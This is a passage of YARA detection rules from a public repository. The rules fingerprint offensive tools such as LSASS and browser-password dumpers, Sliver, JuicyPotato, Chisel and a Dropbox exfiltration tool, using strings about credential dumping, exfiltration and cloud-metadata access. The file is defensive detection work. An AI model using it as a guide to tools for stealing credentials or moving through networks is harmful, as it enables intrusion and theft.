		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "321f06af098283638f99d027dc3c95a25a72192a25c7afa5081a7dbff8c3acb7"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "DeprecatedServiceAccount" fullword ascii
		$s2 = "LivenessProbe" fullword ascii
		$s3 = "\\t\\tkubectl expose rs nginx --port=80 --target-port=8000" ascii
		$s4 = "\\t\\tkubectl run hazelcast --image=hazelcast --port=5701" ascii
		$s5 = "COMPREPLY[$i]=${COMPREPLY[$i]#\"$colon_word\"}" ascii
		$s6 = "%*polymorphichelpers.HistoryViewerFunc" ascii
		$s7 = "ListenAndServeTLS" ascii
		$s8 = "DownwardAPI" ascii
		$s9 = "; plural=(n%10==1 && n%100!=11 ? 0 : n != 0 ? 1 : 2);proto:" ascii
		$s10 = "name: attack-" ascii

	condition:
		uint16( 0 ) == 0x457f and 9 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PET_Botb : FILE
{
	meta:
		description = "Detects Break out the Box (BOtB)"
		author = "ditekSHen"
		id = "acafa6dd-51b9-5945-b1df-7763a97a424f"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L696-L710"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a01f796b27852f9217d9bfea32f8d9ffb3c88521d4413f6612f7a0544cf44fb3"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "to unallocated span%%!%c(*big.Float=%s), RecursionDesired: /usr/share/zoneinfo//{Bucket}/{Key+}?acl/{Bucket}?accelerate/{Bucket}?encryption/{Bucket}?" ascii
		$s2 = "exploit CVE-2019-5736 with command: [ERROR] In Enabling CGROUP Notifications -> 'echo 1 > [INFO] CGROUP may exist, attempting exploit regardless" ascii
		$s3 = "main.execShellCmd" ascii
		$s4 = "[*] Data uploaded to:[+]" ascii
		$s5 = "whitespace or line breakfailed to find credentials in the environment.failed to get %s EC2 instance role credentialsfirst" ascii
		$s6 = "This process will exit IF an EXECVE is called in the Container or if the Container is manually stoppedPerform reverse DNS lookups" ascii
		$s7 = "http: request too largehttp://100.100.100.200/http://169.254.169.254/index out of range" ascii

	condition:
		uint16( 0 ) == 0x457f and 6 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_LSASS_Createminidump : FILE
{
	meta:
		description = "Detects CreateMiniDump tool"
		author = "ditekSHen"
		id = "0d8642d1-2ed9-5270-a54a-6ba788026f5f"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L712-L724"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "577ccc783554363c0bed80d9642e8a0f107fc2ec66d84f76b9556aa3506c86c0"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "lsass.dmp" fullword wide
		$s2 = "lsass dumped successfully!" ascii
		$s3 = "Got lsass.exe PID:" ascii
		$s4 = "\\experiments\\CreateMiniDump\\CreateMiniDump\\" ascii
		$s5 = "MiniDumpWriteDump" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 2 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Securityxploded_Browserpassworddumper : FILE
{
	meta:
		description = "Detects SecurityXploded Browser Password Dumper tool"
		author = "ditekSHen"
		id = "ce90ef96-43c0-5d68-ba7d-21aafb3f754b"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L726-L737"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b3c6e9b393c244c7bf6489f54ebd622a09da050a65d6dbde325d5bcd7d85f39a"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\projects\\windows\\BrowserPasswordDump\\Release\\FireMaster.pdb" ascii
		$s2 = "%s: Dumping passwords" fullword ascii
		$s3 = "%s - Found login data file...dumping the passwords from file %s" fullword ascii
		$s4 = "%s Dumping secrets from login json file %s" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Securityxploded_Ftppassworddumper : FILE
{
	meta:
		description = "Detects SecurityXploded FTP Password Dumper tool"
		author = "ditekSHen"
		id = "d876c201-b527-531c-9563-0b1a1c6334cb"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L739-L750"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "941bfb9b1ce71252c5aa05bd654bdcf1af6cc1d5f720bc2c239e17454f15beda"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\projects\\windows\\FTPPasswordDump\\Release\\FireMaster.pdb" ascii
		$s2 = "//Dump all the FTP passwords to a file \"c:\\passlist.txt\"" ascii
		$s3 = "//Dump all the FTP passwords to console" ascii
		$s4 = "FTP Password Dump" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Securityxploded_Emailpassworddumper : FILE
{
	meta:
		description = "Detects SecurityXploded Email Password Dumper tool"
		author = "ditekSHen"
		id = "25e140de-4a0a-5d4f-a93f-a414b9879f2b"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L752-L764"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7f07611385d45bf45bfb8ee95e56febfb992fb7b416321c5b590878636a5c1b7"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\projects\\windows\\EmailPasswordDump\\Release\\FireMaster.pdb" ascii
		$s2 = "//Dump all the Email passwords to a file \"c:\\passlist.txt\"" ascii
		$s3 = "EmailPasswordDump" fullword wide
		$s4 = "//Dump all the Email passwords to console" ascii
		$s5 = "Email Password Dump" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Goclr : FILE
{
	meta:
		description = "Detects binaries utilizing Go-CLR for hosting the CLR in a Go process and using it to execute a DLL from disk or an assembly from memory"
		author = "ditekSHen"
		id = "21766cad-17dd-525a-9ebe-cd90e892cff1"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L800-L814"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a2a79793b1f530bcf9f79983f29a655f270cf0147606690b19eaeb82d4bd1f0d"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "github.com/ropnop/go-clr.(*IC" ascii
		$s2 = "EnumKeyExWRegEnumValueWRegOpenKeyExWRtlCopyMemoryRtlGetVersionShellExecuteWStartServiceW" ascii
		$c1 = "ICorRuntimeHost" ascii wide
		$c2 = "CLRCreateInstance" ascii wide
		$c3 = "ICLRRuntimeInfo" ascii wide
		$c4 = "ICLRMetaHost" ascii wide
		$go = "Go build ID:" ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $s* ) or ( 2 of ( $c* ) and $go )
}
rule DITEKSHEN_INDICATOR_TOOL_Edgecookiesview : FILE
{
	meta:
		description = "Detects EdgeCookiesView"
		author = "ditekSHen"
		id = "42c6eb2e-bf5c-5956-9009-c29551ce715d"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L833-L847"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9ba6d416e02c1958806356c67636609dcca758da9f7e3d1fc15244cc5ff038fc"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "AddRemarkCookiesTXT" fullword wide
		$s2 = "# Netscape HTTP Cookie File" fullword wide
		$s3 = "/scookiestxt" fullword wide
		$s4 = "/deleteregkey" fullword wide
		$s5 = "Load cookies from:" wide
		$s6 = "Old cookies folder of Edge/IE" wide
		$pdb = "\\EdgeCookiesView\\Release\\EdgeCookiesView.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 5 of ( $s* ) or ( ( $pdb ) and 2 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Sharpnopsexec : FILE
{
	meta:
		description = "Detects SharpNoPSExec"
		author = "ditekSHen"
		id = "10898364-6d77-5127-a16b-5fd3b1c652d5"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L849-L864"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c1d76639e7b6464d302729b48bbcd810216132868035904bb9866e7b31ccfac2"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "|-> Service" wide
		$s2 = "authenticated as" wide
		$s3 = "ImpersonateLoggedOnUser failed. Error:{0}" wide
		$s4 = "uPayload" fullword ascii
		$s5 = "pcbBytesNeeded" fullword ascii
		$s6 = "SharpNoPSExec" ascii wide
		$pdb1 = "SharpNoPSExec\\obj\\Debug\\SharpNoPSExec.pdb" ascii
		$pdb2 = "SharpNoPSExec\\obj\\Release\\SharpNoPSExec.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 4 of ( $s* ) or ( 1 of ( $pdb* ) and 1 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Chromecookiesview : FILE
{
	meta:
		description = "Detects ChromeCookiesView"
		author = "ditekSHen"
		id = "c1b89468-edf2-59d1-89b3-5822fa19d6ab"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L866-L880"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "81acd0978fc03525e7092ab51c681b61f9de0252066ce871298e2cd96b1d3024"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "AddRemarkCookiesTXT" fullword wide
		$s2 = "Decrypt cookies" wide
		$s3 = "/scookiestxt" fullword wide
		$s4 = "/deleteregkey" fullword wide
		$s5 = "Cookies.txt Format" wide
		$s6 = "# Netscape HTTP Cookie File" wide
		$pdb = "\\ChromeCookiesView\\Release\\ChromeCookiesView.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 5 of ( $s* ) or ( ( $pdb ) and 2 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Sliver : FILE
{
	meta:
		description = "Detects Sliver implant cross-platform adversary emulation/red team"
		author = "ditekSHen"
		id = "e0c5404b-8e6b-5c3a-9e37-56012c3802dd"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L882-L900"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4f9442b74c84c7b4a8fcf93de2919d12efe2f41d0b4e8514b43822fba0962af2"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "github.com/bishopfox/sliver/protobuf/sliverpbb." ascii
		$s1 = ".commonpb.ResponseR" ascii
		$s2 = ".PortfwdProtocol" ascii
		$s3 = ".WGTCPForwarder" ascii
		$s4 = ".WGSocksServerR" ascii
		$s5 = ".PivotEntryR" ascii
		$s6 = ".BackdoorReq" ascii
		$s7 = ".ProcessDumpReq" ascii
		$s8 = ".InvokeSpawnDllReq" ascii
		$s9 = ".SpawnDll" ascii
		$s10 = ".TCPPivotReq" ascii

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f or uint16( 0 ) == 0xfacf ) and ( 1 of ( $x* ) or 5 of ( $s* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Backstab : FILE
{
	meta:
		description = "Detect Backstab tool capable of killing antimalware protected processes by leveraging sysinternals Process Explorer (ProcExp) driver"
		author = "ditekSHen"
		id = "1e514d03-9b78-5e75-9a31-02c0413e23a7"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L923-L939"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d25c3ff4d7c120fdf7c275d11da7a321bcbdb275dcfaa699b5bb4bd66167ec92"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "NtLoadDriver: %x" fullword ascii
		$s2 = "POSIXLY_CORRECT" fullword ascii
		$s3 = "\\\\.\\PROCEXP" ascii
		$s4 = "ProcExpOpenProtectedProcess.DeviceIoControl: %" ascii
		$s5 = "ProcExpKillHandle.DeviceIoControl" ascii
		$s6 = "[%#llu] [%ws]: %ws" fullword ascii
		$s7 = "D:P(A;;GA;;;SY)(A;;GRGWGX;;;BA)(A;;GR" wide
		$s8 = "-k -d c:\\\\driver.sys" ascii
		$s9 = "backstab.exe -" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 6 of them
}
rule DITEKSHEN_INDICATOR_TOOL_EXP_Sharpprintnightmare : FILE
{
	meta:
		description = "Detect SharpPrintNightmare"
		author = "ditekSHen"
		id = "15f52fce-27cc-52e7-91d5-7e2f6db5b596"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L941-L961"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "22c890a22ce6b7c1a06068018364f7c5a2afe1bee5b5bc6a8bae3703a11fac26"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "RevertToSelf() Error:" wide
		$s2 = "NeverGonnaGiveYou" wide
		$s3 = "\\Amd64\\UNIDRV.DLL" wide
		$s4 = ":\\Windows\\System32\\DriverStore\\FileRepository\\" wide
		$s5 = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}" wide
		$s6 = "\\SharpPrintNightmare\\" ascii
		$s7 = { 4e 61 6d 65 09 46 75 6c 6c 54 72 75 73 74 01 }
		$s8 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\PackageInstallation\\Windows x64\\DriverPackages" wide
		$s9 = "ntprint.inf_amd64" wide
		$s10 = "AddPrinterDriverEx" wide
		$s11 = "addPrinter" ascii
		$s12 = "DRIVER_INFO_2" ascii
		$s13 = "APD_COPY_" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 7 of them
}
rule DITEKSHEN_INDICATOR_TOOL_REC_Adfind : FILE
{
	meta:
		description = "Detect ADFind"
		author = "ditekSHen"
		id = "2f0d02a1-7488-5645-aa08-1eadee2862e8"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L963-L974"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "41fb9f72032f76adc6f1fccd25a1364f153eb2430063e9d582f3dcd9fc9ac84a"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\AdFind\\AdFind\\AdFind.h" ascii
		$s2 = "\\AdFind\\AdFind\\AdFind.cpp" ascii
		$s3 = "\\AdFind\\Release\\AdFind.pdb" ascii
		$s4 = "joeware_default_adfind.cf" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 2 of them
}
rule DITEKSHEN_INDICATOR_TOOL_CNC_Chisel : FILE
{
	meta:
		description = "Detect binaries using Chisel"
		author = "ditekSHen"
		id = "d126f2c8-655f-564f-ae46-f6bd6385dcac"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L976-L990"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "08c7b2c4725431c1bf85ae8068f4250c98e58890e3b4c97aa9e419e4f487cada"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "chisel-v" ascii
		$s2 = "sendchisel-v" ascii
		$s3 = "<-chiselclosedcookiedomainefenceempty" ascii
		$ws1 = "Sec-WebSocket-Key" ascii
		$ws2 = "Sec-WebSocket-Protocol" ascii
		$ws3 = "Sec-Websocket-Version" ascii
		$ws4 = "Sec-Websocket-Extensions" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 1 of ( $s* ) and 3 of ( $ws* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_ANT_Invizzzible : FILE
{
	meta:
		description = "Detect InviZzzible"
		author = "ditekSHen"
		id = "23533d1c-e0d8-51c8-ac18-60c845bff197"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1025-L1059"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd84015f9fdc160a6ed9010c5a5905fcf13987b1fdec6fdd9535e315dc3617e8"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "\\\\.\\pipe\\task_sched_se" fullword wide
		$s2 = "\\\\\\.\\NPF_NdisWanIp" fullword wide
		$s3 = /--action --(dtt|mra|user-input|cfg|dan|evt|pid|exc|wmi|tsh)/ fullword wide
		$s4 = "cuckoo_%lu.ini" fullword wide
		$s5 = "sandbox evasion" wide nocase
		$s6 = "UnbalancedStack" fullword ascii
		$s7 = "process_with_long_name" fullword ascii
		$s8 = "DelaysAccumulation" fullword ascii
		$s9 = "PidReuse" fullword ascii
		$s10 = "DeadAnalyzer" fullword ascii
		$s11 = "SleepDummyPatch" fullword ascii
		$s12 = "AudioDeviceAbsence" fullword ascii
		$s14 = "\\\\.\\PhysicalDrive%u" fullword ascii
		$s15 = "\"countermeasures\":" ascii
		$s16 = "_%.02u%.02u%.02u_%.02u%.02u%.02u.html" ascii
		$f1 = ".?AVHyperV@SandboxEvasion@@" ascii
		$f2 = ".?AVJoebox@SandboxEvasion@@" ascii
		$f3 = ".?AVKVM@SandboxEvasion@@" ascii
		$f4 = ".?AVMisc@SandboxEvasion@@" ascii
		$f5 = ".?AVParallels@SandboxEvasion@@" ascii
		$f6 = ".?AVQEMU@SandboxEvasion@@" ascii
		$f7 = ".?AVSandboxie@SandboxEvasion@@" ascii
		$f8 = ".?AVVBOX@SandboxEvasion@@" ascii
		$f9 = ".?AVVirtualPC@SandboxEvasion@@" ascii
		$f10 = ".?AVVMWare@SandboxEvasion@@" ascii
		$f11 = ".?AVWine@SandboxEvasion@@" ascii
		$f12 = ".?AVXen@SandboxEvasion@@" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 6 of ( $s* ) or 4 of ( $f* ) or ( 2 of ( $f* ) and 2 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_EXFIL_Sharpbox : FILE
{
	meta:
		description = "Detect SharpBox, C# tool for compressing, encrypting, and exfiltrating data to Dropbox using the Dropbox API"
		author = "ditekSHen"
		id = "cd834fe2-dc77-509d-a8f9-d631f395bcd8"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1061-L1080"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b03ab3786b2a2e6774d94be4edf700a7154d8d400c7b2b31c73c68ce9fe0c08a"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "UploadData" fullword ascii
		$s2 = "isAttached" fullword ascii
		$s3 = "DecryptFile" fullword ascii
		$s4 = "set_dbxPath" fullword ascii
		$s5 = "set_dbxToken" fullword ascii
		$s6 = "set_decrypt" fullword ascii
		$s7 = "GeneratePass" fullword ascii
		$s8 = "FileUploadToDropbox" fullword ascii
		$s9 = "\\SharpBox.pdb" ascii
		$s10 = "https://content.dropboxapi.com/2/files/upload" fullword wide
		$s12 = "Dropbox-API-Arg: {\"path\":" wide
		$s13 = "X509Certificate [{0}] Policy Error: '{1}'" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and 7 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PET_Sharpstrike : FILE
{
	meta:
		description = "Detect SharpStrike post-exploitation tool written in C# that uses either CIM or WMI to query remote systems"
		author = "ditekSHen"
		id = "00b36fce-3d84-51cf-a800-042d7484d78c"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1145-L1160"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c479d85878d9f9659fc157f0c6706703af3748a8740df6a5090cddc720dd7661"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "SharpStrike v" wide
		$x2 = "[*] Agent is busy" wide
		$x3 = "SharpStrike_Fody" fullword ascii
		$s1 = "ServiceLayer.CIM" fullword ascii
		$s2 = "Models.CIM" fullword ascii
		$s3 = "<HandleCommand>b__" ascii
		$s4 = "MemoryStream" fullword ascii
		$s5 = "GetCommands" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 2 of ( $x* ) or all of ( $s* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_LTM_Ladon : FILE
{
	meta:
		description = "Detect Ladon tool that assists in lateral movement across a network"
		author = "ditekSHen"
		id = "227e63ce-8383-5bb1-870e-6c4e767b402f"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1162-L1178"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f31276bcbcae672966cfddc9af4f5b507d7244360b421de7fe1e811fb954fb7d"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$d1 = "Ladon.VncSharp.dll" fullword ascii
		$d2 = "Ladon.Renci.SshNet.dll" fullword ascii
		$s1 = "Ladon." ascii
		$s2 = "nowPos" fullword ascii
		$s3 = "Scan" fullword ascii
		$s4 = "QLZ_STREAMING_BUFFER" fullword ascii
		$s5 = "sizeDecompressed" fullword ascii
		$s6 = "UpdateByte" fullword ascii
		$s7 = "kNumBitPriceShiftBits" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $d* ) or all of ( $s* ) or ( 1 of ( $d* ) and 5 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_LTM_Ladonexp : FILE
{
	meta:
		description = "Detect Ladon tool that assists in lateral movement across a network"
		author = "ditekSHen"
		id = "bd1e7ef5-ae68-5e0d-8261-0eb765453bae"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1180-L1191"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "22f6a717b8464bddd850bb5ea8b416e99bceb91fe917f188be178f2fff620730"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "txt_cscandll.Text" fullword wide
		$s2 = "CscanWebExpBuild.frmMain.resources" fullword ascii
		$s3 = "= \"$HttpXforwardedFor$\";" ascii
		$s4 = "namespace netscan" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_LTM_Ladongo : FILE
{
	meta:
		description = "Detect LadonGo tool that assists in lateral movement across a network"
		author = "ditekSHen"
		id = "4dbf7f24-b9ab-5629-8e78-667d9623dea9"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1193-L1207"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "606172b8fb251cb4ad75de40b55d74779aef6409832f6edf09068083143ec749"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$f1 = "main.VulDetection" fullword ascii
		$f2 = "main.BruteFor" fullword ascii
		$f3 = "main.RemoteExec" fullword ascii
		$f4 = "main.Exploit" fullword ascii
		$f5 = "main.Noping" fullword ascii
		$f6 = "main.LadonScan" fullword ascii
		$f7 = "main.LadonUrlScan" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f or uint16( 0 ) == 0xface ) and 5 of ( $f* )
}
rule DITEKSHEN_INDICATOR_TOOL_ENC_Diskcryptor : FILE
{
	meta:
		description = "Detect DiskCryptor open encryption solution that offers encryption of all disk partitions"
		author = "ditekSHen"
		id = "22b25d5c-d67f-53ac-9ae8-2de077afdda9"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1209-L1232"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7ef0bf3b11f7e4055908518ce5b6a49e04d7002ebc3396fd2da32b4e13cf68e0"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "\\DiskCryptor\\DCrypt\\" ascii
		$s1 = "Error getting %sbootloader configuration" fullword wide
		$s2 = "loader.iso" fullword wide
		$s3 = "Bootloader config for [%s]" fullword wide
		$s4 = "dc_get_mbr_config" fullword ascii
		$s5 = "dc_encrypt_iso_image" fullword ascii
		$s6 = "dc_start_re_encrypt" fullword ascii
		$s7 = "dc_start_encrypt" fullword ascii
		$s8 = "_w10_reflect_" ascii
		$d1 = "\\DosDevices\\dcrypt" fullword wide
		$d2 = "$dcsys$_fail_%x" fullword wide
		$d3 = "%s\\$DC_TRIM_%x$" fullword wide
		$d4 = "\\Device\\dcrypt" fullword wide
		$d5 = "%s\\$dcsys$" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and ( ( 1 of ( $x* ) and 2 of ( $s* ) ) or 4 of ( $s* ) or 3 of ( $d* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_PRI_Juicypotato : FILE
{
	meta:
		description = "Detect JuicyPotato"
		author = "ditekSHen"
		id = "2fb52598-9771-507b-a06d-7b9bc693ffee"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1255-L1270"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "43a7ac16b9633fd2e6c43ca142cd0d0e2166287bb51e1b6344119959fe054c19"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "\\JuicyPotato.pdb" ascii
		$x2 = "JuicyPotato v%s" fullword ascii
		$s1 = "hello.stg" fullword wide
		$s2 = "ppVirtualProcessorRoots" fullword ascii
		$s3 = "Lock already taken" fullword ascii
		$s4 = "[+] authresult %d" fullword ascii
		$s5 = "RPC -> send failed with error: %d" fullword ascii
		$s6 = "Priv Adjust FALSE" fullword ascii

	condition:
